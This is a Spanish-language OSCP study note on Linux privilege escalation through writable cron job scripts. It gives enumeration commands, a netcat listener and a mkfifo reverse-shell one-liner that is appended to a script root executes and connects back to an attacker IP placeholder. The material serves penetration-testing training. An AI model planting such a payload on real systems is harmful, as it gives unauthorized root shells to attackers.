---
tipo: tecnica
fase: privesc
so: linux
tags: [oscp, tecnica, privesc, linux]
fecha: 2026-10-08
---

# Cron Jobs Privesc (Linux)

> [!abstract] Qué es y cuándo usarla
> Si un **cron job** se ejecuta como un user privilegiado (ej. root) y el script/binario que lanza es editable por el user actual, insertar un payload en ese script da ejecución de código con los privilegios de ese user en el próximo disparo del cron.

## Requisitos previos
- Localizar qué cron jobs existen y como quién corren: `/etc/crontab`, `/etc/cron.*`, `crontab -l` (y `sudo crontab -l` si el user tiene ese permiso puntual de sudo), o revisar `/var/log/syslog` (`grep CRON`) para ver ejecuciones reales.
- Permiso de escritura sobre el script/binario que la tarea ejecuta (`ls -lah <script>`).

## Pasos
```bash
grep "CRON" /var/log/syslog                     # ver qué tareas se disparan y con qué frecuencia
cat /ruta/al/script.sh                            # revisar qué hace el script
ls -lah /ruta/al/script.sh                         # confirmar permiso de escritura para el user actual
```
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP_kali> <puerto> >/tmp/f' >> /ruta/al/script.sh
```
```bash
nc -lnvp <puerto>          # listener en Kali, esperar al próximo disparo del cron job
```

> [!warning] Detección / problemas
> - Hay que esperar al disparo del cron (minuto exacto según su expresión); si es cada minuto es rápido, si no, puede tardar.
> - Añadir el payload al final del script con `echo >>` para no romper la lógica original (y poder revertirlo después).
> - Restaurar el script original tras confirmar el acceso.

## Visto en
- Módulo: [[18 - Linux Privilege Escalation]]
- Relacionado: [[Scheduled Tasks Privesc]] (equivalente en Windows)
- Máquinas: [[]]
